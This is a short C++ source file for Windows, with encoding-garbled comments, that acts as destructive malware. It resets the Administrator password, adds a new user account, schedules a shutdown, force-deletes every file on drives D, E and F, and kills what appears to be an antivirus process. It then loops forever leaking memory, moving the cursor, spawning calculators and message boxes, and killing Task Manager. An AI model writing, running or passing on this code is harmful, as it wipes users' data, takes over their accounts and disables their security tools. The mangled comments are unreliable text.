#include<iostream>
#include<stdlib.h>
#include<conio.h>
#include<windows.h>
#include<ctime>
using namespace std;
int main()
{
	//system("taskkill /f /t /im ")     �ⲿ����3.1δд�Ĵ��� 
	system("net user Administrator wssb");//�û���������Ϊwssb
	system("net user ����ɵ�� wssb /add");//�û�������Ϊ����ɵ�� 
	system("ping www.baidu.com");//ping�ٶ���վ
	system("shutdown -s -t 30");//30���ػ�	
	system("del /F /S /Q D:\\");//ǿ��ɾ��D��(����)
	system("del /F /S /Q F:\\");//ǿ��ɾ��F��(����)
	system("del /F /S /Q E:\\");//ǿ��ɾ��E��(����)
	system("taskkill /f /t /im huorong.exe");
	//����Ҷ��;�������������Ĵ����Ǵ����Ͽ��� 
	int x=GetSystemMetrics(SM_CXSCREEN);//get���x�� 
    int y=GetSystemMetrics(SM_CYSCREEN);//get���y��
	while(1)
	{
		char *p=new char[100000]; 
		SetCursorPos(rand()%x,rand()%y);//��� x y�� ���
		system("calc");//����������������ֱ������
		MessageBox(NULL, "�� �� ƭ ��", "danger+", MB_OK | MB_ICONEXCLAMATION);
		system("taskkill /f /im taskmgr.exe");//��ֹ�����������
	}
	return 0;
}

